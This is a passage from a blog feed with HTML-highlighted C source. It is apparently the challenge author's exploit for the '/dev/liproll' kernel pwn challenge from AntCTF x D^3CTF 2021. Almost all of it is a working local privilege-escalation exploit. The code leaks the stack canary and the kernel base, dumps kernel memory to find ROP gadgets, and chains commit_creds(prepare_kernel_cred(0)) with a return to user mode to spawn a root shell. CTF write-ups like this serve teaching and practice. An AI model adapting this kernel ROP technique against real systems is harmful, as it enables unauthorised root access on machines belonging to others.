class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ioctl(fd, CREATE, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reset</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ioctl(fd, RESET, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">choose</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> idx)</span> </span>&#123;</span><br><span class="line">    choose_args arg;</span><br><span class="line">    arg.idx = idx;</span><br><span class="line">    ioctl(fd, CHOOSE, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cast</span><span class="params">(<span class="keyword">u_int8_t</span> *buf, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    cast_args arg;</span><br><span class="line">    arg.buf = buf;</span><br><span class="line">    arg.len = len;</span><br><span class="line">    ioctl(fd, CAST, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gadgets_finder</span><span class="params">(<span class="keyword">u_int8_t</span> *codes, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (found.cmp_rdx_rcx == <span class="number">0</span> &amp;&amp; \</span><br><span class="line">            machinecode_cmp(codes+i, code_cmp_rdx_rcx, <span class="number">6</span>)) &#123;</span><br><span class="line">            found.cmp_rdx_rcx = i + <span class="number">0x401160</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (found.commit_creds == <span class="number">0</span> &amp;&amp; \</span><br><span class="line">            machinecode_cmp(codes+i, code_commit_creds, <span class="number">32</span>)) &#123;</span><br><span class="line">            found.commit_creds = i + <span class="number">0x401160</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (found.iretq_ret == <span class="number">0</span> &amp;&amp; \</span><br><span class="line">            machinecode_cmp(codes+i, code_iretq_ret, <span class="number">3</span>)) &#123;</span><br><span class="line">            found.iretq_ret = i + <span class="number">0x401160</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (found.mov_rdi_rax_ret == <span class="number">0</span> &amp;&amp; \</span><br><span class="line">            machinecode_cmp(codes+i, code_mov_rdi_rax_ret, <span class="number">13</span>)) &#123;</span><br><span class="line">            found.mov_rdi_rax_ret = i + <span class="number">0x401160</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (found.prepare_kernel_cred == <span class="number">0</span> &amp;&amp; \</span><br><span class="line">            machinecode_cmp(codes+i, code_prepare_kernel_cred, <span class="number">32</span>)) &#123;</span><br><span class="line">            found.prepare_kernel_cred = i + <span class="number">0x401160</span> - <span class="number">0x34</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (found.pop_rdx_rcx == <span class="number">0</span> &amp;&amp; \</span><br><span class="line">            machinecode_cmp(codes+i, code_pop_rdx_rcx, <span class="number">3</span>)) &#123;</span><br><span class="line">            found.pop_rdx_rcx = i + <span class="number">0x401160</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] found pop_rdx_rcx: 0x%llx\n&quot;</span>, found.pop_rdx_rcx + vmlinux_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] found cmp_rdx_rcx: 0x%llx\n&quot;</span>, found.cmp_rdx_rcx + vmlinux_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] found commit_creds: 0x%llx\n&quot;</span>, found.commit_creds + vmlinux_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] found iretq_ret: 0x%llx\n&quot;</span>, found.iretq_ret + vmlinux_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] found mov_rdi_rax_ret: 0x%llx\n&quot;</span>, found.mov_rdi_rax_ret + vmlinux_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] found prepare_kernel_cred: 0x%llx\n&quot;</span>, found.prepare_kernel_cred + vmlinux_base);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gadgets_generator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    create();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">u_int8_t</span> payload[<span class="number">0x200</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">u_int8_t</span> *codes_dump = <span class="literal">NULL</span>;</span><br><span class="line">    codes_dump = (<span class="keyword">u_int8_t</span> *)<span class="built_in">malloc</span>(<span class="number">0xacfdf0</span>);</span><br><span class="line">    <span class="keyword">if</span> (codes_dump &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        die(<span class="string">&quot;[-] malloc error.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> cur = <span class="number">0x401160</span>, dump_end = <span class="number">0xed1000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] This is dumped code: %p\n&quot;</span>, codes_dump);</span><br><span class="line">    <span class="keyword">while</span>(cur &lt; dump_end) &#123;</span><br><span class="line">        choose(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">memset</span>(payload, <span class="number">0</span>, <span class="keyword">sizeof</span>(payload));</span><br><span class="line">        *(<span class="keyword">size_t</span> *)(payload + <span class="number">0x100</span>) = vmlinux_base + cur;</span><br><span class="line">        *(<span class="keyword">int</span> *)(payload + <span class="number">0x108</span>) = <span class="number">0x100</span>;</span><br><span class="line">        cast(payload, <span class="number">0x110</span>);</span><br><span class="line">        <span class="keyword">int</span> temprecv = read(fd, codes_dump+cur<span class="number">-0x401160</span>, <span class="number">0x100</span>);</span><br><span class="line">        <span class="keyword">if</span>(temprecv &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            die(<span class="string">&quot;[-] read error.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        cur += temprecv;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] start finding gadgets when length is: 0x%x\n&quot;</span>, cur);</span><br><span class="line">    gadgets_finder(codes_dump, cur<span class="number">-0x401160</span>);</span><br><span class="line"></span><br><span class="line">    m = <span class="number">0x110</span> / <span class="number">8</span>;</span><br><span class="line">    rop[m++] = canary;</span><br><span class="line">    rop[m++] = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        prepare_kernel_cred(0);</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    rop[m++] = pop_rdi_ret + vmlinux_base;</span><br><span class="line">    rop[m++] = <span class="number">0</span>;</span><br><span class="line">    rop[m++] = found.prepare_kernel_cred + vmlinux_base;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        commit_creds(prepare_kernel_cred(0));</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    rop[m++] = found.pop_rdx_rcx + vmlinux_base;</span><br><span class="line">    rop[m++] = <span class="number">1</span>;</span><br><span class="line">    rop[m++] = <span class="number">2</span>;</span><br><span class="line">    rop[m++] = found.cmp_rdx_rcx + vmlinux_base;</span><br><span class="line">    rop[m++] = pop_rbx_ret + vmlinux_base;</span><br><span class="line">    rop[m++] = <span class="number">0</span>;</span><br><span class="line">    rop[m++] = found.mov_rdi_rax_ret + vmlinux_base;</span><br><span class="line">    rop[m++] = <span class="number">0</span>;</span><br><span class="line">    rop[m++] = found.commit_creds + vmlinux_base;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        switch to kernel;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    rop[m++] = swapgs_popfq_ret + vmlinux_base;</span><br><span class="line">    rop[m++] = <span class="number">0</span>;</span><br><span class="line">    rop[m++] = found.iretq_ret + vmlinux_base;</span><br><span class="line"></span><br><span class="line">    rop[m++] = (<span class="keyword">size_t</span>)spawn_shell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">    rop[m++] = user_cs;</span><br><span class="line">    rop[m++] = user_rflags;</span><br><span class="line">    rop[m++] = user_sp;</span><br><span class="line">    rop[m++] = user_ss;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/liproll&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        die(<span class="string">&quot;[-] open device error.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    save_status();</span><br><span class="line">    create();</span><br><span class="line">    choose(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">size_t</span> rcv[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(fd, (<span class="keyword">void</span> *)rcv, <span class="number">0x40</span> * <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x40</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] received rcv[%d]: 0x%llx\n&quot;</span>, i, rcv[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    canary = rcv[<span class="number">32</span>];</span><br><span class="line">    vmlinux_base = rcv[<span class="number">52</span>] - <span class="number">0x20007c</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] leak canary: 0x%llx\n&quot;</span>, canary);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] leak vmlinux_base: 0x%llx\n&quot;</span>, vmlinux_base+<span class="number">0x401160</span>);</span><br><span class="line"></span><br><span class="line">    gadgets_generator();</span><br><span class="line"></span><br><span class="line">    reset();</span><br><span class="line">    choose(<span class="number">0</span>);</span><br><span class="line">    cast((<span class="keyword">u_int8_t</span> *)rop, m*<span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;em&gt;I am honored to be one of the questioners of &lt;code&gt;AntCTF x D^3CTF 2021&lt;/code&gt;.&lt;br&gt;In this competition, I came up with 2 pwnable chal</summary>
      
    
    
    
    
  </entry>
  
</feed>
